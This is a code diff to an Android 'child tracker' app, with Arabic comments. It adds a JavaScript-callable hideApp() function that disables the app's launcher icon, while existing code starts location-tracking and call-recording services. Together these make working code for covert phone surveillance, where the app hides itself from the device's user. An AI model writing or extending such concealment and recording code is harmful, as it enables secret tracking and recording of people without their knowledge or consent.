@@ -1,7 +1,10 @@
 package com.abuzahra.tracker
 
+import android.content.ComponentName
 import android.content.Context
-import android.content.Intent // <--- هذا هو السطر الناقص
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
 import android.provider.Settings
 import android.util.Log
 import android.webkit.JavascriptInterface
@@ -15,7 +18,6 @@ import kotlinx.coroutines.tasks.await
 import com.abuzahra.tracker.services.MainTrackerService
 import com.abuzahra.tracker.services.CallRecorderService
 import com.abuzahra.tracker.services.DataSyncWorker
-import android.os.Build
 
 class ChildWebInterface(private val mContext: Context) {
     private val auth = FirebaseAuth.getInstance()
@@ -57,13 +59,33 @@ class ChildWebInterface(private val mContext: Context) {
     @JavascriptInterface
     fun startServices() { startAllServices() }
 
+    // === دالة الإخفاء الجديدة ===
+    @JavascriptInterface
+    fun hideApp() {
+        Log.d("ChildApp", "Hiding App Icon...")
+        try {
+            val pkg = mContext.packageManager
+            // يجب استخدام اسم الـ Alias الموجود في Manifest
+            val aliasName = ComponentName(mContext, "com.abuzahra.tracker.LauncherAlias")
+            
+            pkg.setComponentEnabledSetting(
+                aliasName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            
+            // إرسال رسالة للواجهة (اختياري)
+            sendResult("window.onAppHidden()")
+        } catch (e: Exception) {
+            Log.e("ChildApp", "Failed to hide app", e)
+        }
+    }
+
     private fun startAllServices() {
-        // 1. خدمة التتبع
         val intent = Intent(mContext, MainTrackerService::class.java)
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) mContext.startForegroundService(intent) else mContext.startService(intent)
         
-        // 2. خدمة تسجيل المكالمات
         val recIntent = Intent(mContext, CallRecorderService::class.java)
         recIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) mContext.startForegroundService(recIntent) else mContext.startService(recIntent)
